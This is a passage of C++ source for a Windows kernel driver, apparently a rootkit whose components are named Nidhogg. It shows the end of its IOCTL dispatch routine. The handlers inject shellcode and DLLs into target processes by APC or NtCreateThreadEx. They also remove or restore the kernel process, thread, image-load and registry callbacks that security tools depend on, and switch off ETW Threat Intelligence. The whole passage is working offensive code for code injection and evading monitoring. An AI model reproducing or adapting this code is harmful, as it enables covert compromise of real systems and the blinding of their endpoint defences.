			status = parameter2Alloc.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
		}

		if (!NT_SUCCESS(status))
			break;

		if (shellcodeInfo.Parameter3Size > 0) {
			MemoryAllocator<PVOID> parameter3Alloc(shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size, PagedPool);
			status = parameter3Alloc.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
		}

		if (!NT_SUCCESS(status))
			break;

		switch (shellcodeInfo.Type) {
			case APCInjection: {
				if (!Features.ApcInjection) {
					KdPrint((DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n"));
					status = STATUS_UNSUCCESSFUL;
					break;
				}

				status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
				break;
			}
			case NtCreateThreadExInjection: {
				if (!Features.CreateThreadInjection) {
					KdPrint((DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n"));
					status = STATUS_UNSUCCESSFUL;
					break;
				}

				status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
				break;
		}

		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Shellcode injected successfully.\n"));
		else
			KdPrint((DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status));

		len += sizeof(ShellcodeInformation);
		break;
	}

	case IOCTL_INJECT_DLL:
	{
		DllInformation dllInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(DllInformation))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (DllInformation*)Irp->AssociatedIrp.SystemBuffer;
		dllInfo.Pid = data->Pid;
		dllInfo.Type = data->Type;
		SIZE_T dllPathSize = strlen(data->DllPath);

		if (dllPathSize > MAX_PATH) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		MemoryAllocator<CHAR*> dllPathAllocator(dllInfo.DllPath, dllPathSize + 1, PagedPool);
		status = dllPathAllocator.CopyData(data->DllPath, dllPathSize);

		if (!NT_SUCCESS(status))
			break;

		if (!VALID_PROCESS(dllInfo.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (dllInfo.Type) {
			case APCInjection: {
				if (!Features.ApcInjection) {
					KdPrint((DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n"));
					status = STATUS_UNSUCCESSFUL;
					break;
				}

				status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
				break;
			}
			case NtCreateThreadExInjection: {
				if (!Features.CreateThreadInjection) {
					KdPrint((DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n"));
					status = STATUS_UNSUCCESSFUL;
					break;
				}

				status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
				break;
		}
		
		if (NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "DLL injected successfully.\n"));
		else
			KdPrint((DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status));

		len += sizeof(DllInformation);
		break;
	}

	case IOCTL_LIST_OBCALLBACKS: 
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(ObCallbacksList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (ObCallbacksList*)Irp->AssociatedIrp.SystemBuffer;

		if (data->NumberOfCallbacks == 0 && data->Callbacks) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
			case ObProcessType:
			case ObThreadType: {
				status = NidhoggAntiAnalysis->ListObCallbacks(data);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
		}

		len += sizeof(ObCallbacksList);
		break;
	}

	case IOCTL_LIST_PSROUTINES:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(PsRoutinesList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (PsRoutinesList*)Irp->AssociatedIrp.SystemBuffer;

		switch (data->Type) {
			case PsImageLoadType:
			case PsCreateProcessTypeEx:
			case PsCreateProcessType: 
			case PsCreateThreadType:
			case PsCreateThreadTypeNonSystemThread: {
				status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
				break;
			}
			default:
				status = STATUS_INVALID_PARAMETER;
		}

		len += sizeof(PsRoutinesList);
		break;
	}
	case IOCTL_LIST_REGCALLBACKS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(CmCallbacksList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);

		len += sizeof(CmCallbacksList);
		break;
	}

	case IOCTL_REMOVE_RESTORE_CALLBACK:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(KernelCallback))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (KernelCallback*)Irp->AssociatedIrp.SystemBuffer;

		if (data->CallbackAddress <= 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Remove) {
			switch (data->Type) {
				case PsImageLoadType:
				case PsCreateProcessType:
				case PsCreateProcessTypeEx:
				case PsCreateThreadType:
				case PsCreateThreadTypeNonSystemThread:
				case ObProcessType:
				case ObThreadType:
				case CmRegistryType: {
					status = NidhoggAntiAnalysis->RemoveCallback(data);
					break;
				}
				default:
					status = STATUS_INVALID_PARAMETER;
			}

			if (NT_SUCCESS(status))
				KdPrint((DRIVER_PREFIX "Removed callback %p\n", data->CallbackAddress));
			else
				KdPrint((DRIVER_PREFIX "Failed to remove callback (0x%08X)\n", status));
		}
		else {
			switch (data->Type) {
				case PsImageLoadType:
				case PsCreateProcessType:
				case PsCreateProcessTypeEx:
				case PsCreateThreadType:
				case PsCreateThreadTypeNonSystemThread:
				case ObProcessType:
				case ObThreadType:
				case CmRegistryType: {
					status = NidhoggAntiAnalysis->RestoreCallback(data);
					break;
				}
				default:
					status = STATUS_INVALID_PARAMETER;
			}

			if (NT_SUCCESS(status))
				KdPrint((DRIVER_PREFIX "Restored callback %p\n", data->CallbackAddress));
			else
				KdPrint((DRIVER_PREFIX "Failed to restore callback (0x%08X)\n", status));
		}

		len += sizeof(KernelCallback);
		break;
	}

	case IOCTL_ENABLE_DISABLE_ETWTI:
	{
		bool enable = false;

		if (!Features.EtwTiTamper) {
			KdPrint((DRIVER_PREFIX "Due to previous error, etwti tampering is unavaliable.\n"));
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!VALID_SIZE(size, sizeof(bool))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = (bool*)Irp->AssociatedIrp.SystemBuffer;
		MemoryAllocator<bool*> enableAllocator(&enable, sizeof(bool), PagedPool);
		status = enableAllocator.CopyData(data, sizeof(bool));

		if (!NT_SUCCESS(status))
			break;
		status = NidhoggAntiAnalysis->EnableDisableEtwTI(enable);

		if (!NT_SUCCESS(status))
			KdPrint((DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status));

		len += sizeof(ULONG);
		break;
	}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = len;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
